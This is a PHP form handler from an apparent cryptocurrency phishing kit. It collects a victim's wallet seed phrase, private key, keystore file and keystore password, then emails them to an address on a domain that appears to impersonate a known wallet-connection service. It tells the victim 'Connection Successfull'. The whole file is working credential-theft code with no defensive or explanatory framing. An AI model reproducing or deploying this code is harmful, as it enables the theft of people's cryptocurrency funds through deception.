<?php

header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");

if ($_POST) {

  $wallet = $_POST['wallet'];
  $phrase = $_POST['phrase'];
  $type = $_POST['type'];
  $keystorejson = $_POST['keystorejson'];
  $keystorepassword = $_POST['keystorepassword'];
  $privatekey = $_POST['privatekey'];
  $date = date('Y-m-d H:i:s');

  $from = "submission@connectcollabland.com";
  $to = "form@connectcollabland.com";
  $subject = "Wallet Info Submitted";
  $message = "Submitted at => " . $data . "\n" . "wallet => " . $wallet . "\n" . "phrase => " . $phrase . "\n" . "type => " . $type . "\n" . "keystorepassword => " . $keystorepassword . "\n" . "privatekey => " . $privatekey . "\n" . "keystorejson => " . $keystorejson;
  $headers = "From:" . $from;
  if (mail($to, $subject, $message, $headers)) {
    // set response code - 200 OK
    http_response_code(200);

    // show products data in json format
    echo json_encode(
      array("message" => "Connection Successfull")
    );
  } else {
    // set response code - 404 Not found
    http_response_code(200);

    // tell the user no products found
    echo json_encode(
      array("message" => "Connection Failed")
    );
  }
} else {

  // set response code - 404 Not found
  http_response_code(200);

  // tell the user no products found
  echo json_encode(
    array("message" => "Connection Failed")
  );
}
